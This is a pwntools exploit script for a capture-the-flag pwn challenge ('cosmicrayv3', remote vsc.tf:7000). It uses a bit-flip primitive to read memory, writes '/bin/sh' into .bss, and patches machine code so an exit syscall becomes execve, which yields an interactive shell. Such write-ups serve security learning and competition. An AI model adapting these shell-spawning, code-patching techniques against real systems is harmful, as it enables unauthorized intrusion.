#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './cosmicrayv3_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc-2.35.so'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'vsc.tf', 7000

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# break *0x0401456
break *0x04015e5
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec cosmicrayv3
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

def flip_bit(where, pos):
    io.sendlineafter(b'through:', hex(where).encode())
    io.sendlineafter(b'flip:', str(pos).encode())

def read_byte(where):
    io.sendlineafter(b'through:', hex(where).encode())

    io.recvuntil(b'-----------------\n')
    res = bytes([int(b''.join(io.recvline().strip().split(b'|')).decode(),2)])

    io.sendlineafter(b'flip:', b'1')
    flip_bit(where, 1) # undo

    return res

def read_qword(where):
    res = b''
    for i in range(8):
        res += read_byte(where + i)
    return u64(res[::-1])

def string_modify(base, old, new):
    to_change = bytes(a ^ b for a, b in zip(old, new))
    to_change_bytes = [format(byte, '08b') for byte in to_change]

    for byte in range(len(to_change_bytes)):
        for bit in range(len(to_change_bytes[byte])):
            if to_change_bytes[byte][bit] == '1':
                flip_bit(base + byte, bit)

def modify_byte(base, old, new):
    to_change = old ^ new
    to_change_bits = format(to_change, '08b')
    for bit in range(8):
        if to_change_bits[bit] == '1':
            flip_bit(base, bit)

def exploit():
    global io
    io = initialize()

    # change ret, to something else idk, but it 
    # allows for infinite loop on main()
    flip_bit(0x4015aa, 2)

    # write /bin/sh to .bss
    string_modify(0x404020 + 0x200, b'\x00'*8, b'/bin/sh\x00')

    # MOV EAX,0x3c => MOV EAX,0x3b
    modify_byte(0x4015e5+1, 0x3c, 0x3b)

    # XOR RDI, RDI; SYSCALL => MOV RDI, 0x404220; NOP; XOR RSI, RSI; XOR RDX, RDX; SYSCALL
    opcodes = [0x48, 0xC7, 0xC7, 0x20, 0x42, 0x40, 0x00, 0x90,  0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x0F, 0x05]
    for i in range(len(opcodes)):
        modify_byte(0x04015ea+i, elf.read(0x4015ea+i, 1)[0], opcodes[i])

    # change back to ret, so program will actually return now
    flip_bit(0x4015aa, 2)

    io.interactive()
    
if __name__ == '__main__':
    exploit()